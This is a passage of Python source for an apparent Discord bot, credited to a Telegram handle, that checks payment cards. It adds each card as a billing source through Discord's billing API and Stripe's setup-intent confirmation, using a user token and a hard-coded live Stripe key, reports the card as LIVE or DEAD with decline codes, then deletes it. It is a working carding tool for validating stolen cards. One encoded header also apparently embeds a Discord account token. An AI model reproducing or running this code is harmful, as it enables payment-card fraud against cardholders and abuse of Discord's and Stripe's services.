            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        }
        try:
            response = session.post('https://discord.com/api/v9/users/@me/billing/stripe/setup-intents', headers=__header2)
        except:
            embed = discord.Embed(title=":x: ERROR :x:")
            embed.description = "# Failed To Post Request"
            embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return
        try:
            csTok = response.json()["client_secret"]
            Stok = str(csTok).split('_secret_')[0]
        except Exception as e:  
            embed = discord.Embed(title=":x: DEAD :x:")
            embed.description = "# Failed To Auth Card"
            embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return 'F'
        
        __header3 = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Europe/Budapest',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
    }
        
        jsonD = {
        'billing_address': {
            'name': cardName,
            'line_1': line_1,
            'line_2': '',
            'city': city,
            'state': state,
            'postal_code': postalcode,
            'country': country,
            'email': '',
        },
    }

        try:
            response = session.post(
        'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
        headers=__header3,
        json=jsonD
    )
        except Exception as e:
            embed = discord.Embed(title=":x: ERROR :x:")
            embed.description = "# Failed To Post Request"
            embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return
        try: 
            BTok = response.json()["token"]
        except Exception as e:
            embed = discord.Embed(title=":x: DEAD :x:")
            embed.description = "# Failed To Auth Card"
            embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return 'F'
        
        __header4 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'Authorization': 'Bearer pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }    
        data = f'payment_method_data[type]=card&payment_method_data[card][token]={TokenCard}&payment_method_data[billing_details][address][line1]={line_1}&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][state]={state}&payment_method_data[billing_details][address][postal_code]={postalcode}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][name]={cardName}&payment_method_data[guid]={uuid.uuid4()}&payment_method_data[muid]={uuid.uuid4()}&payment_method_data[sid]={uuid.uuid4()}&payment_method_data[payment_user_agent]=stripe.js%2F28b7ba8f85%3B+stripe-js-v3%2F28b7ba8f85&payment_method_data[referrer]=https%3A%2F%2Fdiscord.com&payment_method_data[time_on_page]=707159&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&client_secret={csTok}'
        try:
            response = session.post(
        f'https://api.stripe.com/v1/setup_intents/{Stok}/confirm',
        headers=__header4,
        data=data
    )
        except Exception as e:
            embed = discord.Embed(title=":x: ERROR :x:")
            embed.description = "# Failed To Post Request"
            embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return
        try: 
            CardSCMAIN = response.json()["id"]
            pmTok = response.json()["payment_method"]
        except Exception as e:
            if "Your card was declined." in response.text or "card_declined" in response.text or "generic_decline" in response.text:
                embed = discord.Embed(title=":x: DEAD :x:")
                embed.description = "# Failed To Auth Card"
                embed.add_field(name="Response ➤ ", value=f"```Code: {response.json()['error']['code']}\nReason: {response.json()['error']['decline_code']}\nMessage: {response.json()['error']['message']}```", inline=True)
                embed.set_footer(text='Bot By https://t.me/csolver')
               
                try:
                    await ctx.respond(embed=embed)
                except:
                    await ctx.send(embed=embed)
                return 'F'
            
            else:
                embed = discord.Embed(title=":x: DEAD :x:")
                embed.description = "# Failed To Auth Card"
                embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)

                embed.set_footer(text='Bot By https://t.me/csolver')
                try:
                    await ctx.respond(embed=embed)
                except:
                    await ctx.send(embed=embed)
                return 'F'
        
        header5 = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Europe/Budapest',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
    }

        jsonD2 = {
        'payment_gateway': 1,
        'token': pmTok,
        'billing_address': {
            'name': cardName,
            'line_1': line_1,
            'line_2': None,
            'city': city,
            'state': state,
            'postal_code': postalcode,
            'country': country,
            'email': '',
        },
        'billing_address_token': BTok
    }
        
        try:
            response = session.post(
        'https://discord.com/api/v9/users/@me/billing/payment-sources',
        headers=header5,
        json=jsonD2
    )
        except Exception as e:
            embed = discord.Embed(title=":x: ERROR :x:")
            embed.description = "# Failed To Post Request"
            embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
        
        try:
            purchaseId = response.json()["id"]
            embed = discord.Embed(title=":white_check_mark: LIVE :white_check_mark: ")
            embed.description = "# Successfully Authed Card"
            embed.add_field(name="Response ➤ ", value=f"`Auth Successful`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
                
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            
            __rcookie = CookieFetch()

            cookies = {
                '__dcfduid': __rcookie.get('__dcfduid'),
                '__sdcfduid': __rcookie.get('__sdcfduid'),
                '__cfruid': __rcookie.get('__cfruid'),
                'locale': 'en-US',
            }
            
            __headers = {
                'authority': 'discord.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': token,
                'origin': 'https://discord.com',
                'referer': 'https://discord.com/channels/@me/1209553062172172372',
                'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZGlzY29yZC5jb20vP2Rpc2NvcmR0b2tlbj1NVEEzTURReU56RXhNVGM1TVRJNE5ESTROQS5HYWNhYnIuVE9NZUVzbHdiczJ2OFRlck4wOTM3SzVvS0ZFMFZyZW5fdWF6Q1kiLCJyZWZlcnJpbmdfZG9tYWluIjoiZGlzY29yZC5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY5MTY2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            }
            responsez = session.delete(
                f'https://discord.com/api/v9/users/@me/billing/payment-sources/{purchaseId}',
                headers=__headers, cookies=cookies
            )
            if responsez.status_code == 204:
                return 'S'
            else: 
                return responsez.json() 
        except Exception as e:
            if 'captcha_key' in str(response.json()):
                embed = discord.Embed(title=":x: ERROR :x:")
                embed.description = "# Captcha Error"
                embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                embed.set_footer(text='Bot By https://t.me/csolver')
                try:
                    await ctx.respond(embed=embed)
                except:
                    await ctx.send(embed=embed)

bot.run(TOKEN)
